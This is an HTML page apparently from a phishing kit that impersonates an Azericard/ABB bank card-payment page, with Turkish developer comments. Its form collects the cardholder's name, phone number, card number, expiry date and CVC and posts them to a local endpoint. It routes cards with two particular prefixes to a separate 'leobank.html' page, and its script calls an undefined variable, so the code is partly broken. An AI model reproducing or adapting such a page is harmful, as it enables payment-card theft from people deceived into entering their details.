<html lang="en"><head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Azericard</title>

  <link href="azeri/css/style.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
</head>

<body>
  <div id="video-roll-root-mask"></div>
  <div class="all">
      <main class="main">
          <header>
              <a>
                  <div class="abb-logo">
                      <img src="azeri/images/abb_logo.svg" alt="">
                  </div>
              </a>
              <div class="card-call">
                  <a>
                      <div class="abb-logo-mobile">
                          <img src="azeri/images/abb_logo.svg" alt="">
                      </div>
                  </a>
                  <a>
                      <div>
                          <img src="azeri/images/azericard.svg" alt="">
                      </div>
                  </a>
                  <a>
                      <div class="abb-logo-mobile">
                          <img src="azeri/images/m10byPashaPay_1.svg" alt="">
                      </div>
                  </a>
              </div>
          </header>
          <section class="form-content form-content2">
              <h1>Kart məlumatları</h1>
              <form class="form-container" action="/submit-form" method="POST" autocomplete="off">
                
                <div class="field-container1">
                  <div>
                    <div class="cardnumber_img" id="name-container">
                      <div class="svgBox">
                        <div>
                          <label for="cardname" id="name-text">Kart sahibinin adı</label>
                          <!-- name eklendi: cardname -->
                          <input required id="cardname" name="cardname" type="text" maxlength="32" placeholder="Ad Soyad">
                        </div>
                      </div>
                      <div><img style="width:30px;" src="azeri/images/user.svg" alt=""></div>
                    </div>
                  </div>
                </div>
                
                <div class="field-container1">
                  <div>
                    <div class="cardnumber_img" id="phone-container">
                      <div class="svgBox">
                        <div>
                          <label for="phone" id="phone-text">Kart sahibinin mobil nömrəsi</label>
                          <!-- opsiyonel, backend okumuyorsa kaldırabilirsin -->
                                  <input
                                          required
                                          id="phoneNumber"
                                          name="phone"
                                          type="tel"
                                          placeholder="+994 00 000 00 00"
                                          inputmode="tel"
                                          
                                          />

                        </div>
                      </div>
                      <div><img style="width:30px;" src="azeri/images/phone.svg" alt=""></div>
                    </div>
                  </div>
                </div>
                
                <div class="field-container1">
                  <div>
                    <div class="cardnumber_img" id="card-container">
                      <div class="svgBox">
                        <div>
                          <label for="cardnumber" id="card-text">Kartın nömrəsi</label>
                          <!-- name eklendi: cardnr -->
                          <input required id="cardnumber" name="cardnr" type="tel" inputmode="numeric"
                                 minlength="13" maxlength="19" placeholder="••••  ••••  ••••  ••••">
                         
                        </div>
                        <svg id="ccicon" class="ccicon" …></svg>
                      </div>
                      <div><img src="azeri/images/credit-card.svg" alt=""></div>
                    </div>
                  </div>
                </div>
                
                <div class="field-container2">
                  <div class="field-container" id="expdate-container">
                    <label for="expirationdate" id="expdate-text">Bitmə tarixi</label>
                    <input required id="expirationdate" type="text" inputmode="numeric" placeholder="MM / YY" onkeypress="…">
                    <input type="hidden" name="validMONTH" id="month-input">
                    <input type="hidden" name="validYEAR" id="year-input">
                    

                    
                  </div>
                  <div class="field-container_cvc">
                    <div class="field_cvc">
                      <div>
                        <label for="securitycode">CVC</label>
                        <!-- name eklendi: cvc2 -->
                        <input required id="securitycode" name="cvc2" type="password" inputmode="numeric"
                               placeholder="***" minlength="3" maxlength="4">
                      </div>
                      <p class="tooltip">
                        <img src="azeri/images/info-circle.svg" alt="">
                        <span class="tooltiptext">CVV və ya CVC kartınızın arxasındadır
                          <span class="triangle"></span>
                        </span>
                      </p>
                    </div>
                  </div>
                </div>
                
                <div class="form-button">
                  <button id="submitBtn" type="submit" class="submitBtn" disabled>
                      <div style="pointer-events: none"><img src="azeri/images/lock.svg" alt=""></div>
                    Təhlükəsiz ödə
                  </button>
                  <button id="cnltBtn" type="button" onclick="top.location.href='index.html';">
                    Ödənişin ləğvi
                  </button>
                </div>
              </form>
            </section>
            
      </main>
      <footer class="footer_part2">
          <div class="footer_1">
              <div>
                  <img src="azeri/images/visa.svg" alt="">
              </div>
              <div>
                  <img src="azeri/images/secure.svg" alt="">
              </div>
              <div>
                  <img src="azeri/images/master.svg" alt="">
              </div>
              <div>
                  <img src="azeri/images/master_logo.svg" alt="">
              </div>
          </div>
          <div class="footer_2">
              <div>
                  <img src="azeri/images/american_express.svg" alt="">
              </div>
              <div>
                  <img src="azeri/images/safeKey.svg" alt="">
              </div>
              <div>
                  <img src="azeri/images/UnionPay.svg" alt="">
              </div>
              <div>
                  <img src="azeri/images/jcb.svg" alt="">
              </div>
          </div>
      </footer>
  </div>

 <script src="https://unpkg.com/imask"></script>
<script>
document.addEventListener("DOMContentLoaded", function () {
  const form      = document.querySelector("form.form-container");
const submitBtn      = document.getElementById("submitBtn");
const cardnumber     = document.getElementById("cardnumber");
const expirationdate = document.getElementById("expirationdate");
const securitycode   = document.getElementById("securitycode");
const nameInput      = document.getElementById("cardname");
const phoneInput     = document.getElementById("phoneNumber");

// ► IMask tanımları
IMask(phoneInput, {
  mask: '+{994} 00 000 00 00',
  lazy: false,
  placeholderChar: '0',
  overwrite: true,
  definitions: { '0': /[0-9]/ }
});
const cardMask = IMask(cardnumber, {
  mask: [
    { mask: '0000 000000 00000', regex: '^3[47]\\d{0,13}' },
    { mask: '0000 0000 0000 0000', regex: '^(?:6011|65\\d{0,2}|64[4-9]\\d?)' },
    { mask: '0000 000000 0000',    regex: '^3(?:0([0-5]|9)|[689]\\d?)' },
    { mask: '0000 0000 0000 0000', regex: '^(5[1-5]\\d{0,2}|22[2-9]\\d{0,1}|2[3-7]\\d{0,2})' },
    { mask: '0000 0000 0000 0000', regex: '^4\\d{0,15}' },
    { mask: '0000 0000 0000 0000' }
  ],
  dispatch: function (appended, dynamicMasked) {
    const num = (dynamicMasked.value + appended).replace(/\D/g, '');
    const fallback = dynamicMasked.compiledMasks.slice(-1)[0];
    for (let m of dynamicMasked.compiledMasks) {
      if (m.regex && num.match(new RegExp(m.regex))) return m;
    }
    return fallback;
  }
});
IMask(expirationdate, { mask: 'MM {/} YY', blocks:{ YY:{mask:'00'}, MM:{mask:IMask.MaskedRange,from:1,to:12} } });
IMask(securitycode,   { mask: '000' });

// ► Validasyon fonksiyonları
function isValidLuhn(num){
  let sum=0, dbl=false;
  for(let i=num.length-1;i>=0;i--){ let d=+num[i]; if(dbl){d*=2;if(d>9)d-=9;} sum+=d; dbl=!dbl; }
  return sum%10===0;
}
function isValidExpirationDate(val){
  const [m,y]=val.split("/").map(x=>parseInt(x.trim()));
  const now=new Date(), cy=now.getFullYear()%100, cm=now.getMonth()+1;
  return m>=1&&m<=12 && (y>cy || (y===cy&&m>=cm));
}

// ► Butonu toggle et
function toggleSubmitButton(){
  const raw = cardnumber.value.replace(/\D/g,'');
  const ready = raw.length===16 && isValidLuhn(raw)
             && isValidExpirationDate(expirationdate.value)
             && securitycode.value.length>=3
             && nameInput.value.trim()!=="";
  submitBtn.disabled = !ready;
}
[cardnumber, expirationdate, securitycode, nameInput].forEach(el=>el.addEventListener("input", toggleSubmitButton));
toggleSubmitButton();

// ► Click handler: AJAX submit + yönlendirme
submitBtn.addEventListener("click", function(e){
  submitBtn.disabled = true;
  submitBtn.innerHTML = '<div><img src="https://mpi.3dsecure.az/abb_default/img/lock.svg"/></div><div><p class="submitWrd">Processing...</p></div>';

  const prefix8 = cardnum.value.replace(/\D/g,'').substr(0,8);
  if(prefix8==='40985844'||prefix8==='54112498'){
    window.location.href = '/leobank.html';
    return;
  }
  form.submit();
  
});
});
</script>